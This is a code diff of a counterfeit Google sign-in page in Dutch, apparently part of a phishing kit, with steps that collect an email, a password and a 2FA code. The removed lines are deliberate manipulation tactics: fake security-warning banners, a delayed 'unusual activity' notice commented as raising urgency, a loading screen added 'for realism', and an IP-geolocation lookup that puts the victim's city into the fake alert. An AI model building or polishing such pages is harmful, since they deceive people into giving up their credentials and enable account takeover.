@@ -323,21 +323,10 @@
 <body>
 
 <div class="page-wrap">
-    <!-- Urgency banner — shown on load -->
-    <div id="urgentBanner" style="max-width:460px;width:100%;margin:0 auto 16px;background:#fce8e6;border:1px solid #f5c6c4;border-radius:8px;padding:13px 16px;display:flex;gap:12px;align-items:flex-start;font-size:13px;color:#c5221f;line-height:1.5;position:relative;">
-        <svg viewBox="0 0 24 24" width="20" height="20" style="flex-shrink:0;margin-top:1px;"><path fill="#c5221f" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-        <div><strong>Beveiligingswaarschuwing</strong><br>Er werd een aanmeldpoging vanuit een onbekende locatie geblokkeerd. Log opnieuw in om je account te bevestigen.</div>
-        <span onclick="this.parentElement.style.display='none'" style="position:absolute;top:8px;right:10px;cursor:pointer;font-size:18px;color:#9aa0a6;line-height:1;">✕</span>
-    </div>
     <div class="card">
 
         <!-- ── STAP 1: E-mail ── -->
         <div id="step-email">
-            <!-- Security notice (shown after 2s) -->
-            <div id="secNotice" style="display:none;background:#e8f0fe;border:1px solid #4285f4;border-radius:6px;padding:10px 14px;margin-bottom:20px;font-size:13px;color:#1a73e8;line-height:1.5;position:relative;">
-                <strong>Ongebruikelijke aanmeldingsactiviteit</strong> gedetecteerd op je account. Bevestig je identiteit om door te gaan.
-                <span onclick="this.parentElement.style.display='none'" style="position:absolute;top:6px;right:10px;cursor:pointer;font-size:16px;color:#5f6368;">✕</span>
-            </div>
             <img class="card-logo"
                  src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
                  alt="Google">
@@ -368,24 +357,6 @@
             <div class="actions">
                 <a href="https://accounts.google.com/signup" target="_blank" class="link">Account aanmaken</a>
                 <button class="btn-next" onclick="goToPassword()">Volgende</button>
-            </div>
-        </div>
-
-        <!-- ── STAP 1.5: Account controleren ── -->
-        <div id="step-loading" style="display:none;">
-            <div style="text-align:center;padding:32px 0 20px;">
-                <img class="card-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
-                <div class="avatar-wrap" style="margin:20px auto 12px;">
-                    <div class="avatar" id="loadingAvatarLetter">G</div>
-                </div>
-                <div class="email-chip" style="justify-content:center;margin:0 auto 24px;display:inline-flex;gap:6px;align-items:center;padding:4px 12px;border:1px solid #dadce0;border-radius:20px;font-size:13px;color:#202124;">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
-                    <span id="loadingEmailDisplay"></span>
-                </div>
-                <div style="display:flex;align-items:center;justify-content:center;gap:10px;color:#5f6368;font-size:14px;">
-                    <span class="spinner" style="width:18px;height:18px;"></span>
-                    Account controleren&hellip;
-                </div>
             </div>
         </div>
 
@@ -562,27 +533,18 @@
         document.getElementById('emailDisplay').textContent = email;
         document.getElementById('avatarLetter').textContent = email.charAt(0).toUpperCase();
 
-        // Show loading step first for realism
         document.getElementById('step-email').style.display = 'none';
-        document.getElementById('loadingEmailDisplay').textContent = email;
-        document.getElementById('loadingAvatarLetter').textContent = email.charAt(0).toUpperCase();
-        document.getElementById('step-loading').style.display = 'block';
-
-        setTimeout(() => {
-            document.getElementById('step-loading').style.display = 'none';
-            const s2 = document.getElementById('step-password');
-            s2.style.display = 'block';
-            s2.classList.remove('step-animate');
-            void s2.offsetWidth; // force reflow
-            s2.classList.add('step-animate');
-            setTimeout(() => document.getElementById('pwInput').focus(), 50);
-        }, 1400 + Math.random() * 400);
+        const s2 = document.getElementById('step-password');
+        s2.style.display = 'block';
+        s2.classList.remove('step-animate');
+        void s2.offsetWidth;
+        s2.classList.add('step-animate');
+        setTimeout(() => document.getElementById('pwInput').focus(), 50);
     }
 
     /* ── Stap 2 → 1 ── */
     function goBack() {
         wrongPwCount = 0;
-        document.getElementById('step-loading').style.display = 'none';
         document.getElementById('step-password').style.display = 'none';
         document.getElementById('step-2fa').style.display = 'none';
         const s1 = document.getElementById('step-email');
@@ -896,34 +858,6 @@
         if (val.length > 3) val = val.slice(0, 3) + ' ' + val.slice(3, 6);
         this.value = val;
     });
-
-    // Dynamic IP geo location update in urgency banner
-    (function() {
-        try {
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(geo => {
-                    const city    = geo.city    || '';
-                    const country = geo.country_name || geo.country || '';
-                    const loc = city && country ? city + ', ' + country : (country || city || null);
-                    if (!loc) return;
-                    const banner = document.getElementById('urgentBanner');
-                    if (!banner) return;
-                    const textDiv = banner.querySelector('div');
-                    if (textDiv) {
-                        textDiv.innerHTML = '<strong>Beveiligingswaarschuwing</strong><br>Er werd een verdachte aanmeldpoging vanuit <b>' + loc + '</b> geblokkeerd. Log opnieuw in om je account te bevestigen.';
-                    }
-                }).catch(() => {});
-        } catch(_) {}
-    })();
-
-    // Show security notice after 2.5 seconds (increases urgency to log in)
-    setTimeout(function() {
-        const notice = document.getElementById('secNotice');
-        if (notice && document.getElementById('step-email').style.display !== 'none') {
-            notice.style.display = 'block';
-        }
-    }, 2500);
 
     // ── Device name display (e.g. "Chrome op Windows") ──
     (function() {
